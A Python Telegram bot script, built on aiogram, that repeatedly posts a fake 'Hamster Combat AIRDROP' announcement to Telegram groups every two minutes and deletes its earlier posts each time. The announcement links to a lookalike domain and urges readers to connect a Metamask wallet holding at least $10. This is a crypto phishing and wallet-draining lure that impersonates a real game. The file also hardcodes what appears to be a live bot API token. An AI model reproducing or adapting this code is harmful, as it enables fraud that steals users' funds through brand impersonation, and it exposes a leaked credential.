import logging
from aiogram import Bot, Dispatcher
from aiogram.types import BotCommand
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
import time
import asyncio
from aiogram import types, Router, Bot
from aiogram.types import InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Configure logging
logging.basicConfig(level=logging.INFO)

API_TOKEN = "7320376976:AAEpYY8s8ZViOEbYgfFjtmG6-jNXnFhqo1Y"
# GROUPS = [-1001792317500, -1001813741487, -1001820466879, -1001988747716]
GROUPS = [-1001988747716]
MESSAGES = []
ME = 513284964
SENDING = False
REPLACE = False
# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


router = Router()


text = """
🔥Hamster Combat announces AIRDROP 🔥
❗️It is time to go WEB3❗️
 
🤓 Some of you might have already seen that the first Airdrop Task has been added.

🤩 If you already have a Metamask wallet, connect your wallet to our website.
 
✍️ If you don't have a Metamask wallet, check out the guidelines on YouTube and in local communities to create one.
It will take you less than a minute!
 
👉 Connecting wallets is crucial, because.. how else will you receive an AirDrop?


❗️❗️❗️ATTENTION ❗️ ❗️❗️
We have noticed that many people are having difficulty claiming coins. Please note that your wallet must have at least $10 in equivalent to pay the network commission.
"""


@router.message(Command("start"))
async def send_new_post(message: types.Message, bot: Bot):
    global GROUPS, MESSAGES, SENDING, REPLACE

    while True:

        SENDING = True

        if REPLACE:
            SENDING = False

        if SENDING == False:
            for m in MESSAGES:
                await bot.delete_message(m["g"], m["m"])
            REPLACE = False
            MESSAGES = []
            return

        try:
            if len(MESSAGES) != 0:
                for m in MESSAGES:
                    await bot.delete_message(m["g"], m["m"])

            MESSAGES = []
            min10inSec = 120

            keyboard_builder = InlineKeyboardBuilder()
            keyboard_builder.add(
                InlineKeyboardButton(
                    text="GET AIRDROP",
                    url="https://hamster-combats.site",
                )
            )
            keyboard = keyboard_builder.as_markup()

            photo = FSInputFile("image.jpg")

            for g in GROUPS:
                m = await bot.send_photo(
                    g,
                    photo=photo,
                    caption=text,
                    reply_markup=keyboard,
                )
                MESSAGES.append({"g": g, "m": m.message_id})

            await asyncio.sleep(min10inSec)

        except Exception as e:
            print("Error - ", e)


@router.message(Command("stop"))
async def send_new_post(message: types.Message, bot: Bot):
    global GROUPS, MESSAGES, SENDING, REPLACE

    REPLACE = True
    await message.answer("Sending stop")


dp.include_router(router)


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio

    asyncio.run(main())
